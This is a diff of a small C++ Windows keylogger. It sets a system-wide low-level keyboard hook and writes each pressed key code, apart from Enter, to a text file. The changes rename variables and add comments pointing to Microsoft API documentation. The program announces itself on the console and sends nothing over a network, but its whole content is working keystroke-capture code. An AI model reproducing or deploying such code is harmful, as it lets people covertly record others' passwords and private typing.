@@ -5,23 +5,27 @@
 using namespace std;
 
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
-HHOOK kbh;
+HHOOK keyboardhook;
 ofstream textfile;
-char keypressed;
+char key;
 
+// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-kbdllhookstruct
 LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam){
 		
-		PKBDLLHOOKSTRUCT keypress = (PKBDLLHOOKSTRUCT)lParam;
-
+		// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-kbdllhookstruct
+		LPKBDLLHOOKSTRUCT keypress = (LPKBDLLHOOKSTRUCT)lParam;
 
 		if (code == HC_ACTION && wParam == WM_KEYDOWN){
 			if (keypress->vkCode != VK_RETURN){
-				keypressed = keypress->vkCode;
-				textfile << keypressed;
+				// Saving vkCode (DWORD) to char
+				key = keypress->vkCode;
+				// Writing to text file
+				textfile << key;
 			}
 		}
 
-		return CallNextHookEx(kbh, code, wParam, lParam);
+		// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callnexthookex
+		return CallNextHookEx(keyboardhook, code, wParam, lParam);
 }
 
 int main (){
@@ -31,13 +35,15 @@ int main (){
 	printf("Hooking the keyboard...\n");
 
 	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
-	kbh = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
+	keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
 
 	MSG msg{ 0 };
-	//a very long loop
+
+	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getmessage
 	while (GetMessage(&msg, NULL, 0, 0) != 0);
 	
-	UnhookWindowsHookEx(kbh);
+	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-unhookwindowshookex
+	UnhookWindowsHookEx(keyboardhook);
 
 	textfile.close();
 
